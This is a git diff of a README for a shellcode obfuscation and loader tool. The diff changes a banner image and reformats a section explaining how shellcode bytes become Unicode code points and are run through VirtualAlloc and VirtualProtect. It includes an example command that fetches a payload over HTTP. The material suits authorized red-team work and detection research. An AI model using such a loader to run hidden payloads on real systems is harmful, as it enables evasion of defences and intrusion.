@@ -1,6 +1,8 @@
 # 🛡️ Kemet Shellcode Loader
 
-![Kemet Loader Banner](https://your-cool-image-url-here.com/banner.png)
+![Kemet Loader Banner](https://github.com/user-attachments/assets/95ba5347-a315-4737-b7be-95313f7650bc)
+<img width="900" height="506" alt="image" src="https://github.com/user-attachments/assets/95ba5347-a315-4737-b7be-95313f7650bc" />
+
 
 Kemet Loader is a Unicode‑based shellcode obfuscation and loading framework.  
 It includes both a **Python obfuscator** and **Windows-native loaders** capable of decoding and executing Unicode‑encoded payloads from local files or HTTP sources.
@@ -60,19 +62,19 @@ kemet_http_loader.exe https://example.com/payload.txt
 
 ## 📘 How It Works
 Encoding
-Each shellcode byte is transformed into a Unicode code point:
+- Each shellcode byte is transformed into a Unicode code point:
 ```ini
 encoded = 0x13000 + byte_value
 ```
-Transport
+- Transport
 Encoded content is distributed as UTF‑8 text.
 
-Decoding
+- Decoding
 The loader reads each Unicode code point and subtracts the base offset to recover the original byte.
 
-Execution
+- Execution
 Memory is allocated via VirtualAlloc, permissions updated via VirtualProtect, then executed.
-
+----
 ⚠️ Disclaimer
 This project is for defensive research, education, and authorized security testing only.
 Execution of arbitrary shellcode can be harmful if misused.
